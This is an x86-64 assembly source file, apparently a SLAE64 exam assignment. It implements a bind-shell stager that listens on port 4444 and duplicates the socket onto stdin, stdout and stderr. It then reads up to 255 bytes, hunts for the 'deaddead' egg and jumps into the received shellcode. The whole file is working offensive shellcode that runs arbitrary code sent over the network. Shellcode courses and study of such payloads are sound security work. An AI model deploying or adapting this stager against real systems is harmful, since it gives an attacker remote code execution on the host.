

;Exam Assignment 3
;implementation of egghunter
;Default egg = "deaddead"                       ;
;If connected the stager check of egg , if present execute the code   ;
;You can send a maximum of 255 bytes (egg + code)                     ;
;if no egg , shellcode exit                                           ;
;Christophe G SLAE64 - 1337                                           ;



global _start

     jmp short _start
    _start_code :
		call rsi  ; pass control to received shellcode 

_start:


    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; syscall number 41

    xor rdx , rdx ; null
    push byte 0x29 ; syscall number 41
    pop rax
    push byte 0x2  ; AF_INET
    pop rdi
    push byte 0x1  ; SOCK_STREAM
    pop rsi
    syscall

    ; copy socket descriptor to rdi for future use
    xchg rax , rdi


    ; server.sin_family = AF_INET
    ; server.sin_port = htons(PORT)
    ; server.sin_addr.s_addr = INADDR_ANY
    ; bzero(&server.sin_zero, 8)

     xor rax, rax

     push rax  ; bzero(&server.sin_zero, 8)


     mov rbx , 0xffffffffa3eefffd    ; move ip address , port 4444 , AF_INET (02) in one instruction (noted to remove null of ip address and AF_INET value)


     not rbx
     push rbx
     push rsp  ; save rsp value into the stack , needed for rsi later


    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
    ; syscall number 49


    push byte 0x31 ; (49)
    pop rax
    pop rsi        ; retrieve value of rsp  pushed into the stack before
    push byte 0x10  ; (16 bytes) sockaddr_len
    pop rdx
    syscall


    ; listen(sock, MAX_CLIENTS)
    ; syscall number 50

    push byte 0x32 ; (50)
    pop rax
    push byte 0x2   ;MAX_CLIENTS

    pop rsi
    syscall


    ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
    ; syscall number 43


    push byte 0x2b   ; Accept syscall
    pop rax
    sub rsp, 0x10
    push rsp
    pop rsi       ;(struct sockaddr *)&client

    push byte 0x10
    push rsp
    pop rdx    ; &sockaddr_len

    syscall

    ; store the client socket description
    mov r9, rax

    ; close parent

    push byte 0x3
    pop rax
    syscall





      xchg rdi , r9   ; restore client socket description to rdi
      xor rsi , rsi

  dup2:
      push byte 0x21
      pop rax       ; duplicate sockets  dup2 (new, old) in this case (stdin , stdout , stderr); three times loop
      syscall
    inc rsi
    cmp rsi , 0x3  ; go in the next couple of instruction if equals

 loopne dup2

       xor rsi , rsi
       mul rsi              ; null rax , rdx 
       xor rdi , rdi        ; stdin 
       sub spl , 0xff
       mov rsi , rsp
       mov dl , 0xff
       syscall              ; read syscall (0)

      Inc_rsi:
         cmp dil , 0xff
         jz Exit
         inc rsi
         inc rdi



      cmp [rsi - 4] , dword 0x64616564                   ; egghunter
      jnz Inc_rsi
      cmp [rsi - 8] , dword 0x64616564
      jnz Inc_rsi
      jz _start_code

      Exit:
         push byte 0x3c
         pop rax
         syscall



